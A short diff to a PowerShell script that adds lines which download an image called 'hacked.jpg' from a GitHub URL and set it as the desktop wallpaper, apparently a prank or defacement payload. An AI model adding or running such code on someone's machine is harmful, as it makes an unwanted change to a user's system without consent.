@@ -35,3 +35,7 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
  
 }
+
+$client.DownloadFile(\"https://github.com/Gorgamite/JSON/raw/master/hacked.jpg\" , \"hacked.jpg\")
+
+Set-WallPaper \"-Image hacked.jpg\"
